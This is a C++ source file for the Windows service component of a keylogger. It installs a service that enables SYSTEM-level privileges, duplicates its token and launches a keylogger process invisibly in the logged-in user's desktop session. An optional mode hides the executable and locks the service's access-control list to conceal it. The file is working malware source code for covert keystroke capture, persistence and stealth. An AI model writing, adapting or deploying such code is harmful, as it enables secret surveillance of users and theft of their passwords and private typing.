#include <thread>

#include "config.hpp"
#include "helpers.hpp"
#include "bonus.hpp"

/* ═════════════════════════════════════════════════════════════════════
   Global Variables
═════════════════════════════════════════════════════════════════════ */

namespace
{

SERVICE_STATUS_HANDLE    gStatusHandle = nullptr;
SERVICE_STATUS           gStatus       = {};
Handle                   gStopEvent;
ProcessInformation       gWinkeyPi{new PROCESS_INFORMATION{}};

constexpr auto SUCCESS = 1;
constexpr auto FAILURE = 0;

}

/* ═════════════════════════════════════════════════════════════════════
   Service Manager Class
═════════════════════════════════════════════════════════════════════ */

namespace Service
{

static int Install()
{
    const ScHandle scm(OpenSCManager(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE));
    if (!scm) return PrintLastError<EXIT_FAILURE>("OpenSCManager");

    std::filesystem::path serviceExe  = JoinPath(GetExeDir(), SERVICE_EXE);
    auto                  serviceName = ToUtf16(SERVICE_NAME);

    if (gConfig.HideProcess && !DeployHiddenCopy(serviceExe)) {
        return EXIT_FAILURE;
    }

    const ScHandle service(CreateServiceW(scm.get(),                  // SCM database handle
                                          serviceName.c_str(),        // Name of the service
                                          serviceName.c_str(),        // Display name
                                          SERVICE_ALL_ACCESS,         // Access rights
                                          SERVICE_WIN32_OWN_PROCESS,  // Type of service
                                          SERVICE_DEMAND_START,       // Start type
                                          SERVICE_ERROR_NORMAL,       // Error control type
                                          serviceExe.c_str(),         // Path to the service executable
                                          nullptr,                    // No load ordering group
                                          nullptr,                    // No tag identifier
                                          nullptr,                    // No dependencies
                                          nullptr,                    // LocalSystem account
                                          nullptr                     // No password
                                          ));
    if (!service) return PrintLastError<EXIT_FAILURE>("CreateService");

    if (gConfig.HideProcess) HideDacl();

    std::println("Service {{{}}} installed successfully", SERVICE_NAME);
    return EXIT_SUCCESS;
}

static int InitializeServiceHandle(ScHandle& service, const DWORD dwDesiredAccess)
{
    const ScHandle scm(OpenSCManager(nullptr, nullptr, SC_MANAGER_CONNECT));
    if (!scm) return PrintLastError<EXIT_FAILURE>("OpenSCManager");

    service.reset(OpenService(scm.get(), SERVICE_NAME, dwDesiredAccess));
    if (!service) return PrintLastError<EXIT_FAILURE>("OpenService");

    return EXIT_SUCCESS;
}

static int Start()
{
    ScHandle service;
    if (InitializeServiceHandle(service, SERVICE_START) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    if (!StartService(service.get(), 0, nullptr)) {
        return PrintLastError<EXIT_FAILURE>("StartService");
    }

    std::println("Service {{{}}} started successfully", SERVICE_NAME);
    return EXIT_SUCCESS;
}

static int Stop(bool silent = false)
{
    ScHandle service;
    if (InitializeServiceHandle(service, SERVICE_STOP) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    SERVICE_STATUS status{};
    if (!ControlService(service.get(), SERVICE_CONTROL_STOP, &status) && !silent) {
        return PrintLastError<EXIT_FAILURE>("ControlService");
    }

    if (gConfig.HideProcess) HideDacl();

    if (!silent) std::println("Service {{{}}} stopped successfully", SERVICE_NAME);
    return EXIT_SUCCESS;
}

static int Delete()
{
    ScHandle service;
    if (InitializeServiceHandle(service, DELETE) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    Stop(true);

    if (!DeleteService(service.get())) {
        return PrintLastError<EXIT_FAILURE>("DeleteService");
    }

    if (gConfig.HideProcess) DeleteHiddenCopy();

    std::println("Service {{{}}} deleted successfully", SERVICE_NAME);
    return EXIT_SUCCESS;
}

}

/* ═════════════════════════════════════════════════════════════════════
   Service Entry Point (called by SCM)
═════════════════════════════════════════════════════════════════════ */

static DWORD WINAPI ServiceCtrlHandlerEx(const DWORD ctrl, DWORD, void*, void*) noexcept
{
    if (ctrl == SERVICE_CONTROL_STOP) {
        gStatus.dwCurrentState     = SERVICE_STOP_PENDING;
        gStatus.dwControlsAccepted = 0;
        SetServiceStatus(gStatusHandle, &gStatus);

        LogInfo("Service {{{}}} is stopping...", SERVICE_NAME);

        SetEvent(gStopEvent.get());
        WaitForSingleObject(gWinkeyPi.get()->hProcess, INFINITE);

        return NO_ERROR;
    }
    return ERROR_CALL_NOT_IMPLEMENTED;
}

static void WINAPI ServiceMain(DWORD, LPTSTR*)
{
    auto setStatus = [](const DWORD state, const DWORD win32ExitCode = NO_ERROR) {
        gStatus.dwCurrentState  = state;
        gStatus.dwWin32ExitCode = win32ExitCode;
        if (!SetServiceStatus(gStatusHandle, &gStatus)) {
            return PrintLastError<FAILURE>("SetServiceStatus");
        }
        return SUCCESS;
    };

    auto enablePrivilege = [](const LPCTSTR name) {
        HANDLE hTokenRaw{};
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenRaw)) {
            return PrintLastError<FAILURE>("OpenProcessToken");
        }
        const Handle hToken(hTokenRaw);

        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        if (!LookupPrivilegeValue(nullptr, name, &tp.Privileges[0].Luid)) {
            return PrintLastError<FAILURE>("LookupPrivilegeValue");
        }

        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken.get(), FALSE, &tp, 0, nullptr, nullptr)) {
            return PrintLastError<FAILURE>("AdjustTokenPrivileges");
        }
        return SUCCESS;
    };

    auto check = [&setStatus](auto&& condition, const char* context) {
        if (!condition) {
            setStatus(SERVICE_STOPPED, GetLastError());
            return PrintLastError<FAILURE>(context);
        }
        return SUCCESS;
    };

    // Register service handler
    gStatusHandle = RegisterServiceCtrlHandlerEx(SERVICE_NAME, ServiceCtrlHandlerEx, nullptr);
    if (!gStatusHandle) {
        return (void)PrintLastError<FAILURE>("RegisterServiceCtrlHandlerEx");
    }
    gStatus = {.dwServiceType = SERVICE_WIN32_OWN_PROCESS};

    if (!setStatus(SERVICE_START_PENDING)) return;

    // Enable necessary privileges
    if (!enablePrivilege(SE_INCREASE_QUOTA_NAME) ||      // Required to create a process with another token
        !enablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME) ||  // Required to assign a primary token to the new process
        !enablePrivilege(SE_TCB_NAME)) {                 // Required to modify token session ID (act as OS)
        return;
    }

    // Duplicate system token and set session
    HANDLE systemTokenRaw = nullptr;
    if (!check(OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &systemTokenRaw), "OpenProcessToken")) {
        return;
    }
    const Handle systemToken(systemTokenRaw);

    HANDLE duplicatedTokenRaw = nullptr;
    if (!check(DuplicateTokenEx(systemToken.get(), TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &duplicatedTokenRaw), "DuplicateTokenEx")) {
        return;
    }
    const Handle duplicatedToken(duplicatedTokenRaw);

    DWORD sessionId = WTSGetActiveConsoleSessionId();
    if (!check(SetTokenInformation(duplicatedToken.get(), TokenSessionId, &sessionId, sizeof(sessionId)), "SetTokenInformation")) {
        return;
    }

    // Launch the keylogger in the user session using a SYSTEM token
    const auto   keyloggerExePath = JoinPath(GetExeDir(), gConfig.HideProcess ? HIDDEN_KEYLOGGER_EXE : KEYLOGGER_EXE).wstring();
    STARTUPINFOW si{.cb = sizeof(STARTUPINFOW), .lpDesktop = const_cast<LPWSTR>(L"winsta0\\default")};
    if (!check(CreateProcessAsUserW(duplicatedToken.get(), nullptr, const_cast<LPWSTR>(keyloggerExePath.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, gWinkeyPi.get()), "CreateProcessAsUser")) {
        return;
    }

    gStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    if (!setStatus(SERVICE_RUNNING)) return;

    if (gConfig.HideProcess) HideDacl();

    // Wait until process ends or stop requested
    gStopEvent.reset(CreateEvent(nullptr, TRUE, FALSE, STOP_EVENT));
    if (!check(gStopEvent, "CreateEvent")) {
        return;
    }

    const HANDLE waitHandles[] = {gStopEvent.get(), gWinkeyPi.get()->hProcess};
    WaitForMultipleObjects(2, waitHandles, FALSE, INFINITE);

    setStatus(SERVICE_STOPPED);
}

/* ═════════════════════════════════════════════════════════════════════
   Service Main Function
═════════════════════════════════════════════════════════════════════ */

static void PrintUsage() { LogErr("Usage: svc.exe <install|start|stop|delete>"); }

static int LaunchServiceMain()
{
    const SERVICE_TABLE_ENTRYA table[] = {{const_cast<LPSTR>(SERVICE_NAME), ServiceMain}, {nullptr, nullptr}};

    return StartServiceCtrlDispatcher(table) ? EXIT_SUCCESS : PrintLastError<EXIT_FAILURE>("StartServiceCtrlDispatcher");
}

static int Cli(std::string command)
{
    for (auto& c : command) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));

    if (command == "install") return Service::Install();

    if (gConfig.HideProcess)  OpenDacl();
    if (command == "start")   return Service::Start();
    if (command == "stop")    return Service::Stop();
    if (command == "delete")  return Service::Delete();
    
    LogErr("Unknown command: \'{}\'", command);
    PrintUsage();
    return EXIT_FAILURE;
}

int main(const int argc, char* argv[])
{
    SetConsoleOutputCP(CP_UTF8);

    if (!gConfig.Init(JoinPath(GetExeDir(), CONFIG_FILE))) return EXIT_FAILURE;
    if (argc == 1) return LaunchServiceMain();
    if (argc == 2) return Cli(argv[1]);

    PrintUsage();
    return EXIT_FAILURE;
}
